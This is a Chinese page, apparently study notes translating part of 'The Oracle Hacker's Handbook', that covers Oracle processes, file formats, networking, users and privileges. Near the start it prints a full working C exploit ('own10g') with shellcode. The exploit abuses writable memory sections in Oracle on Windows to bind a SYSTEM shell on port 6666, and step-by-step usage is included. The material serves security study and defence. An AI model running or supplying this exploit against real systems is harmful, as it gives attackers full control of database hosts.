class="toc-number">2.2.5.</span> <span class="toc-text">利用TNS的TTC功能</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BBTNS%E4%BE%A6%E5%90%AC%E5%99%A8%E5%92%8C%E8%B0%83%E5%BA%A6%E7%A8%8B%E5%BA%8F"><span class="toc-number">3.</span> <span class="toc-text">攻击TNS侦听器和调度程序</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TNS%E5%8A%AB%E6%8C%81%E6%94%BB%E5%87%BB"><span class="toc-number">3.1.</span> <span class="toc-text">TNS劫持攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB-GIOP%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">3.2.</span> <span class="toc-text">攻击 GIOP服务器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XML%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">3.3.</span> <span class="toc-text">XML数据库</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E8%BF%87%E7%A8%8B"><span class="toc-number">4.</span> <span class="toc-text">攻击身份验证过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81"><span class="toc-number">4.1.</span> <span class="toc-text">如何进行身份验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%8A%A0%E5%AF%86%E8%BF%87%E7%A8%8B"><span class="toc-number">4.2.</span> <span class="toc-text">攻击加密过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%98%E8%AE%A4%E7%9A%84%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81"><span class="toc-number">4.3.</span> <span class="toc-text">默认的用户名和密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-number">4.4.</span> <span class="toc-text">用户名和密码暴力破解</span></a></li></ol></li></ol>
                </div>
            
        
        
            <p><strong>The  Oracle Hacker’s Handbook: Hacking and Defending Oracle</strong></p>
<p><strong>by David  Litchfield John Wiley &amp; Sons</strong></p>
<p>探索黑帽黑客用来入侵和破坏 Oracle 的每一种技术和工具，这份深入指南向您展示了如何找到数据库中的弱点，以便更好地保护它们。</p>
<p>[TOC]</p>
<h2 id="Oracle-RDBMS概述"><a href="#Oracle-RDBMS概述" class="headerlink" title="Oracle RDBMS概述"></a>Oracle RDBMS概述</h2><h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><p>​        在Windows上还是在Linux平台上,构成Oracle服务器和服务的过程会有所不同。</p>
<p>​        数据库实例描述了提供对数据库访问权限的所有进程和内存结构。有两种后台进程，shadow或服务器。shadow或服务器进程服务于客户端请求。换句话说，当客户端连接到TNS侦听器并请求访问数据库服务时，TNS侦听器会将它们移交给服务器进程。该服务器进程接受SQL查询，并代表客户端执行它们。存在后台进程来支持这一点。有许多不同的后台进程，每个进程都有不同的角色，包括数据库编写器，日志编写器，存档器，系统监视器和进程监视器等。</p>
<p>​        在Linux平台上，这些后台进程中的每个进程都是独立的运行进程，就像在操作系统进程中一样。在Windows上，它们全部打包为一个更大的进程oracle.exe。在Linux的所有进程之间都有一个特殊的内存区域，称为系统全局区域（SGA）。 SGA被实现为内存映射文件（部分），并包含与实例和数据库有关的信息。它还包含一个称为共享池的区域，该区域包含所有用户之间共享的结构，例如表定义等。</p>
<p>​        在Windows上运行的Oracle流程的一个有趣的方面是，该流程可以由“Everyone”组以编程方式打开。以下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1）获取Oracle.exe的进程ID-例如 1892</span><br><span class="line">2）获取数据库SID-例如 ORCL</span><br><span class="line">3）打开2个shell-我们称它们为A和B</span><br><span class="line">4）在命令shell中运行</span><br><span class="line">  C:\&gt;sqlplus /nolog</span><br><span class="line">      SQL*Plus: Release 10.1.0.2.0 - Production on Fri Jun 3 23:18:58</span><br><span class="line">2005</span><br><span class="line">      Copyright (c) 1982, 2004, Oracle. All rights reserved.</span><br><span class="line">      SQL&gt; connect scott/invalidpassword</span><br><span class="line">5）在命令shell B中运行</span><br><span class="line">       C：\&gt; own10g 1892 * oraspawn_buffer_orcl *</span><br><span class="line">6）在命令Shell A中尝试在sqlplus中重新进行身份验证</span><br><span class="line">7）在命令shell B中运行</span><br><span class="line">       C：\&gt; telnet 127.0.0.1 6666</span><br><span class="line">       Microsoft Windows XP [版本5.1.2600]</span><br><span class="line">      Microsoft Windows XP [Version 5.1.2600]</span><br><span class="line">     C:\WINDOWS\system32&gt;c:\whoami</span><br><span class="line">      c:\whoami</span><br><span class="line">      NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;winbase.h&gt;</span><br><span class="line"></span><br><span class="line">HANDLE hSection=NULL;</span><br><span class="line">unsigned char *p = NULL;</span><br><span class="line"></span><br><span class="line">int OpenTheSection(unsigned char *section, DWORD perm);</span><br><span class="line">SIZE_T GetSizeOfSection();</span><br><span class="line">int MapTheSection(unsigned int rw);</span><br><span class="line"></span><br><span class="line">unsigned char shellcode[]=</span><br><span class="line">&quot;\x83\xEC\x24\x55\x8B\xEC\xEB\x03\x58\xEB\x05\xE8\xF8\xFF\xFF\xFF&quot;</span><br><span class="line">&quot;\x83\xC0\x7E\x83\xC0\x7B\x50\x99\x64\x8B\x42\x30\x8B\x40\x0C\x8B&quot;</span><br><span class="line">&quot;\x70\x1C\xAD\x8B\x48\x08\x51\x52\x8B\x7D\xFC\x8B\x3C\x57\x57\x8B&quot;</span><br><span class="line">&quot;\x41\x3C\x8B\x7C\x01\x78\x03\xF9\x8B\x5F\x1C\x8B\x77\x20\x8B\x7F&quot;</span><br><span class="line">&quot;\x24\x03\xF1\x03\xD9\x03\xF9\xAD\x91\x33\xF6\x33\xD2\x8A\x14\x08&quot;</span><br><span class="line">&quot;\x41\xC1\xCE\x0D\x03\xF2\x84\xD2\x75\xF3\x83\xC7\x02\x5A\x52\x66&quot;</span><br><span class="line">&quot;\x3B\xF2\x75\xE5\x5A\x5A\x42\x0F\xB7\x4F\xFE\x03\x04\x8B\x89\x44&quot;</span><br><span class="line">&quot;\x95\x04\x59\x80\xFA\x02\x7E\xAE\x80\xFA\x08\x74\x1E\x52\x80\xFA&quot;</span><br><span class="line">&quot;\x03\x74\x02\xEB\xA1\x99\x52\x68\x33\x32\x20\x20\x68\x77\x73\x32&quot;</span><br><span class="line">&quot;\x5F\x54\xFF\xD0\x83\xC4\x0C\x5A\x91\xEB\x8B\x99\xB6\x02\x2B\xE2&quot;</span><br><span class="line">&quot;\x54\x83\xC2\x02\x52\xFF\xD0\x50\x50\x50\x6A\x06\x6A\x01\x6A\x02&quot;</span><br><span class="line">&quot;\xFF\x55\x14\x8D\x65\xD4\x50\x99\x52\x52\x52\xBA\x02\xFF\x1A\x0A&quot;</span><br><span class="line">&quot;\xFE\xC6\x52\x54\x5F\x6A\x10\x57\x50\xFF\x55\x18\x6A\x01\xFF\x75&quot;</span><br><span class="line"></span><br><span class="line">&quot;\xD0\xFF\x55\x1C\x50\x50\xFF\x75\xD0\xFF\x55\x20\x99\x52\x68\x63&quot;</span><br><span class="line">&quot;\x6D\x64\x20\x54\x5F\x50\x50\x50\x52\x52\xB6\x01\x52\x6A\x0A\x99&quot;</span><br><span class="line">&quot;\x59\x52\xE2\xFD\x6A\x44\x54\x5E\x42\x54\x56\x51\x51\x51\x52\x51&quot;</span><br><span class="line">&quot;\x51\x57\x51\xFF\x55\x0C\xFF\x55\x08\x16\x9F\x9F\xB5\x72\x60\xA8&quot;</span><br><span class="line">&quot;\x6F\x80\x3B\x75\x49\x32\x4C\xE7\xDF&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int WriteShellCode(char *section);</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">      HANDLE hThread = NULL;</span><br><span class="line">      DWORD id = 0;</span><br><span class="line">      HMODULE k=NULL;</span><br><span class="line">      FARPROC mOpenThread = 0;</span><br><span class="line">      FARPROC ntq = 0;</span><br><span class="line">      FARPROC nts = 0;</span><br><span class="line">      unsigned char buff[1024]=&quot;&quot;;</span><br><span class="line">      unsigned int len = 0;</span><br><span class="line">      unsigned int res = 0;</span><br><span class="line">      unsigned int pid = 0;</span><br><span class="line">      unsigned char *p = 0;</span><br><span class="line">      unsigned int tid = 0;</span><br><span class="line">      CONTEXT ctx;</span><br><span class="line">      unsigned char *ptr=NULL;</span><br><span class="line"></span><br><span class="line">      if(argc != 3)</span><br><span class="line">      &#123;</span><br><span class="line">            printf(&quot;\n\n\t*** own10g ***\n\n&quot;);</span><br><span class="line">            printf(&quot;\tC:\\&gt;%s pid section_name\n\n&quot;,argv[0]);</span><br><span class="line">            printf(&quot;\twhere pid is the process ID of Oracle\n&quot;);</span><br><span class="line">            printf(&quot;\tand section_name is *oraspawn_buffer_SID*\n&quot;);</span><br><span class="line">            printf(&quot;\tSID is the database SID - e.g. orcl\n\n&quot;);</span><br><span class="line">            printf(&quot;\tSee notes in source code for full details\n\n&quot;);</span><br><span class="line">            printf(&quot;\tDavid Litchfield\n\t(davidl@ngssoftware.com)&quot;);</span><br><span class="line">			printf(&quot;\n\t3rd June 2005\n\n\n&quot;);</span><br><span class="line">            return 0;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      if(WriteShellCode(argv[2])==0)</span><br><span class="line">            return printf(&quot;Failed to write to section %s\n&quot;,argv[2]);</span><br><span class="line"></span><br><span class="line">      k = LoadLibrary(&quot;kernel32.dll&quot;);</span><br><span class="line">      if(!k)</span><br><span class="line">            return printf(&quot;Failed to load kernel32.dll&quot;);</span><br><span class="line">      mOpenThread = GetProcAddress(k,&quot; OpenThread&quot;);</span><br><span class="line">      if(!mOpenThread)</span><br><span class="line">            return printf(&quot;Failed to get address of OpenThread!&quot;);</span><br><span class="line">      k = LoadLibrary(&quot;ntdll.dll&quot;);</span><br><span class="line"></span><br><span class="line">      if(!k)</span><br><span class="line">            return printf(&quot;Failed to load ntdll.dll&quot;);</span><br><span class="line">      ntq = GetProcAddress(k,&quot; NtQueryInformationThread&quot;);</span><br><span class="line">      if(!ntq)</span><br><span class="line">            return printf(&quot;Failed&quot;);</span><br><span class="line">      nts = GetProcAddress(k,&quot; NtSetInformationThread&quot;);</span><br><span class="line">      if(!nts)</span><br><span class="line">            return printf(&quot;Failed&quot;);</span><br><span class="line"></span><br><span class="line">      tid = atoi(argv[1]);</span><br><span class="line"></span><br><span class="line">      while(id &lt; 0xFFFF)</span><br><span class="line">      &#123;</span><br><span class="line">            hThread = mOpenThread(THREAD_ALL_ACCESS,TRUE,id);</span><br><span class="line">            if(hThread)</span><br><span class="line">            &#123;</span><br><span class="line">                  res = ntq(hThread,0,buff,0x1C,&amp;len);</span><br><span class="line">                  if(res !=0xC0000003)</span><br><span class="line">                  &#123;</span><br><span class="line">                        p = &amp;buff[9];</span><br><span class="line">                        pid = (int) *p;</span><br><span class="line">                        pid = pid &lt;&lt; 8;</span><br><span class="line">                        p--;</span><br><span class="line">                        pid = pid + (int) *p;</span><br><span class="line"></span><br><span class="line">                        if(pid == tid)</span><br><span class="line">                        &#123;</span><br><span class="line">                              printf(&quot;%d\n&quot;,id);</span><br><span class="line">                              ctx.ContextFlags =</span><br><span class="line">CONTEXT_INTEGER|CONTEXT_CONTROL;</span><br><span class="line">                              if(GetThreadContext(hThread,&amp;ctx)==0)</span><br><span class="line">                                    return printf(&quot;Failed to get</span><br><span class="line">context&quot;);</span><br><span class="line">                              ptr = (unsigned char *)&amp;ctx;</span><br><span class="line">                              ptr = ptr + 184;</span><br><span class="line"></span><br><span class="line">            // This exploit assumes the base address of the</span><br><span class="line">            // section is at 0x044D0000. If it is not at this</span><br><span class="line">            // address on your system - change it.</span><br><span class="line"></span><br><span class="line">                              memmove(ptr,&quot;\x40\x01\x4D\x04&quot;,4);</span><br><span class="line">                              if(SetThreadContext(hThread,&amp;ctx)==0)</span><br><span class="line">                                    return</span><br><span class="line">printf(&quot;%d\n&quot;,GetLastError());</span><br><span class="line">                        &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            hThread = NULL;</span><br><span class="line">            id ++;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int WriteShellCode(char *section)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">      SIZE_T size = 0;</span><br><span class="line"></span><br><span class="line">      if(OpenTheSection(section,FILE_MAP_WRITE)==0)</span><br><span class="line">      &#123;</span><br><span class="line">            printf(&quot;OpenTheSection: Section %s\tError:</span><br><span class="line">%d\n&quot;,section,GetLastError());</span><br><span class="line">            return 0;</span><br><span class="line">      &#125;</span><br><span class="line">      if(MapTheSection(FILE_MAP_WRITE)==0)</span><br><span class="line">      &#123;</span><br><span class="line">            printf(&quot;MapTheSection: Section %s\tError:</span><br><span class="line">%d\n&quot;,section,GetLastError());</span><br><span class="line">            return 0;</span><br><span class="line">      &#125;</span><br><span class="line">      size = GetSizeOfSection();</span><br><span class="line">      if(size == 0)</span><br><span class="line">      &#123;</span><br><span class="line">            printf(&quot;GetSizeOfSection: Section %s\tError:</span><br><span class="line">%d\n&quot;,section,GetLastError());</span><br><span class="line">            return 0;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      printf(&quot;Size of section %d\n&quot;,size);</span><br><span class="line"></span><br><span class="line">      if(size &lt; 0x141)</span><br><span class="line">            return 0;</span><br><span class="line"></span><br><span class="line">      size = size - 0x140;</span><br><span class="line"></span><br><span class="line">      if(size &lt; strlen(shellcode))</span><br><span class="line">            return 0;</span><br><span class="line"></span><br><span class="line">      p = p + 0x140;</span><br><span class="line"></span><br><span class="line">      memmove(p,shellcode,strlen(shellcode));</span><br><span class="line"></span><br><span class="line">      return 1;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int OpenTheSection(unsigned char *section, DWORD perm)</span><br><span class="line">&#123;</span><br><span class="line">      SIZE_T size=0;</span><br><span class="line">      hSection = OpenFileMapping(perm, FALSE, section);</span><br><span class="line">      if(!hSection)</span><br><span class="line">            return 0;</span><br><span class="line">      else</span><br><span class="line">            return 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int MapTheSection(unsigned int rw)</span><br><span class="line">&#123;</span><br><span class="line">      p = (char *)MapViewOfFile(hSection, rw, 0, 0, 0);</span><br><span class="line">      if(!p)</span><br><span class="line">            return 0;</span><br><span class="line">      return 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SIZE_T GetSizeOfSection()</span><br><span class="line">&#123;</span><br><span class="line">      MEMORY_BASIC_INFORMATION mbi;</span><br><span class="line">      SIZE_T size=0;</span><br><span class="line">      if(!p)</span><br><span class="line">      &#123;</span><br><span class="line">            printf(&quot;Address not valid.\n&quot;);</span><br><span class="line">            return 0;</span><br><span class="line">      &#125;</span><br><span class="line">      ZeroMemory(&amp;mbi,sizeof(mbi));</span><br><span class="line">      size = VirtualQuery(p,&amp;mbi,sizeof(mbi));</span><br><span class="line">      if(size !=28)</span><br><span class="line">            return 0;</span><br><span class="line">      size = mbi.RegionSize;</span><br><span class="line">      printf(&quot;Size: %d\n&quot;,size);</span><br><span class="line">      return size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        当本地用户尝试在Windows上连接到Oracle时，它将通过命名管道进行连接。 在主服务器进程中创建了四个线程来处理客户端和服务器之间的通信。 这四个线程具有一个自由访问控制列表（DACL），该列表授予用户打开该线程的权限。</p>
<p>​        在第4步中，通过尝试进行身份验证，我们在服务器进程中创建了这些线程。</p>
<p>​        在第5步中，我们运行此漏洞利用程序，这将在服务器进程中打开一个内存部分，并将此处的shellcode写入此处。本部分的地址为0x044D0000（但可能有所不同）。因为本节中的DACL允许每个人都写入该内存，所以我们可以这样做。此部分的名称为* oraspawn_buffer_orcl *，其中orcl是在第2步中获得的数据库SID。注意，我们将shellcode专门写入0x044D0140，即该部分中的0x140字节。我们这样做是为了防止在我们的第二次连接尝试中破坏我们的shellcode。除了将shellcode写入该部分外，我们还设置了线程的执行上下文，换句话说，我们将EIP设置为指向我们的shellcode。</p>
<p>​        在第6步中，我们重新激活睡眠线程并切换到我们的shellcode。</p>
<p>​        shellcode在TCP端口6666上生成一个shell，在第7步中我们将其远程登录到该shell。通过运行whoami，我们将以系统特权运行Shell。</p>
<h3 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h3><p>​        了解文件系统上的Oracle结构非常有用。在后面的章节中，我们将通过直接访问Oracle文件来绕过数据库强制的访问控制，因此本节介绍了基本布局。安装Oracle的基本目录称为Oracle Home。为了使大多数Oracle实用程序都能正常工作，必须将一个环境变量（称为ORACLE_HOME）设置为此目录。</p>
<p>​        大多数Oracle可执行文件和动态链接库都位于 bin\oracle.exe，目录中。因此，$ORACLE_HOME/bin应该在PATH环境变量中；否则，该实用程序将再次无法使用。</p>
<p>​        数据逻辑上存储在表空间中，物理上存储在数据文件中，通常以.dbf为文件扩展名。通常，数据文件位于$</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ORACLE_HOME/oradata/SID</span><br></pre></td></tr></table></figure>

<p>​        目录中，其中SID是数据库SID。这些数据文件具有简单的二进制结构。 </p>
<p>​        Oracle 10g的文件头可以描述如下：字节2表示文件类型-0xA2似乎表示普通数据文件，0xC2是控制文件，0x22是重做日志文件。 0x14至0x17处的DWORD（4个字节）指示文件中每个数据块的大小，0x18至0x1B处的DWORD提供文件中数据块的数目。字节0x1C至0x1F是“魔术”键-始终设置为0x7D7C7B7A。文件头的大小与其他每个块的大小相同，如0x14到0x17，如果它是0x00002000，则将在文件中找到第一个数据块0x00002000字节。</p>
<p>​        每个数据块在字节block_base + 04和block_base + 05处包含其块号，以及从字节block_base + 0x18到block_base + 0x1B的服务器版本。第一个数据块是特殊的，它包含有关数据文件来自的服务器以及文件本身的信息。例如，数据库的SID可以在block_base + 0x20处找到，表空间名称在block_base + 0x52处，并且此名称的长度在block_base + 0x50处的两个字节处。</p>
<p>​        前面提到了另外两种重要的文件类型：控制文件和重做日志。控制文件包含有关数据库服务器物理结构的重要信息。重做日志跟踪对数据文件所做的更改，它们充当服务器与数据文件之间的桥梁：在对数据文件进行任何更改之前，它们首先被写入重做日志。因此，如果数据文件出了问题，则可以从这些重做日志中的信息中恢复状态。检查这些日志文件通常可以向攻击者揭示有用的信息。例如，如果用户使用通过密码语法标识的ALTER USER名称来更改其密码，那么明文密码将被写入Oracle 9及更早版本的重做日志中。</p>
<p>​        数据库初始化配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">init &lt;SID&gt; .ora或spfile &lt;SID&gt; .ora</span><br></pre></td></tr></table></figure>

<p>​        可以位于Windows上的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">％ORACLE_HOME％\database\</span><br></pre></td></tr></table></figure>

<p>​        和Linux平台上的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ORACLE_HOME/dbs</span><br></pre></td></tr></table></figure>

<h3 id="网络结构"><a href="#网络结构" class="headerlink" title="网络结构"></a>网络结构</h3><p>​        可以将Oracle配置为侦听TCP套接字（带有或不带有SSL，IPC，SPX和命名管道）。 对于在Windows平台上查看Oracle的用户，请记住，可以通过网络在TCP端口139和445上访问命名管道。（这意味着，即使已将TNS侦听器配置为不在TCP套接字上侦听，仍然可以通过命名管道，远程访问它。 就TCP而言，通常默认在端口1521或1526上侦听服务器。 </p>
<h3 id="数据库对象"><a href="#数据库对象" class="headerlink" title="数据库对象"></a>数据库对象</h3><p>​        Oracle支持通常会在数据库服务器中期望的典型数据库对象，例如表和视图。 我们稍后将特别注意的其他对象包括触发器，包，过程和函数。 可以通过执行以下SQL列出数据库中存在的所有对象类型：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select distinct object_type from all_objects order by 1;</span><br></pre></td></tr></table></figure>

<p><img src="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8A%E7%AF%87/1.png"></p>
<p>​        在默认安装的Oracle 11g中，列出了43种以上的对象类型。</p>
<h3 id="用户和角色"><a href="#用户和角色" class="headerlink" title="用户和角色"></a>用户和角色</h3><p>​        Oracle要求使用用户ID和密码对用户进行身份验证。 Oracle以其使用默认密码创建的默认帐户数量而闻名。 如今，大多数默认帐户通常都已锁定。</p>
<p>​         Oracle数据库服务器中最强大的用户是SYS，其次是SYSTEM用户。 根据已安装的其他组件，其他功能强大的用户包括但不限于CTXSYS，MDSYS，WKSYS和SYSMAN。 </p>
<p>​        模式是给定用户拥有的对象的集合。 例如，可以说SCOTT拥有的所有表，视图和过程都存在于SCOTT模式中。 还有一个称为PUBLIC的特殊用户，与PUBLIC用户相关的任何事情都适用于数据库中的每个用户。</p>
<h3 id="特权"><a href="#特权" class="headerlink" title="特权"></a>特权</h3><p>​        Oracle中的访问控制由特权分配控制。 有两种特权：对象特权（object）和系统特权（system）。 对象特权是指可以对数据库对象（例如表，视图和过程）操作，而系统特权是指用户可以对数据库执行的操作（例如创建和删除）。 特权可以直接分配给用户或角色。 </p>
<p>​        对象特权包括以下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ALTER</span><br><span class="line">DEBUG</span><br><span class="line">DELETE</span><br><span class="line">DEQUEUE</span><br><span class="line">EXECUTE</span><br><span class="line">FLASHBACK</span><br><span class="line">INDEX</span><br><span class="line">INSERT</span><br><span class="line">ON COMMIT REFRESH</span><br><span class="line">QUERY REWRITE</span><br><span class="line">READ</span><br><span class="line">REFERENCES</span><br><span class="line">SELECT</span><br><span class="line">UNDER</span><br><span class="line">UPDATE</span><br><span class="line">WRITE</span><br></pre></td></tr></table></figure>

<p>​        有超过200个系统特权。 通过执行以下操作，可以获得系统特权的完整列表：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select name from system_privilege_map;</span><br></pre></td></tr></table></figure>

<p><img src="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8A%E7%AF%87/2.png"></p>
<p>​        此外，还有一些系统特权组，例如ALTER ANY，CREATE ANY，EXECUTE ANY，ANALYZE，AUDIT，DEBUG，DELETE ANY和DROP ANY。 例如，EXECUTE ANY包括以下内容：</p>
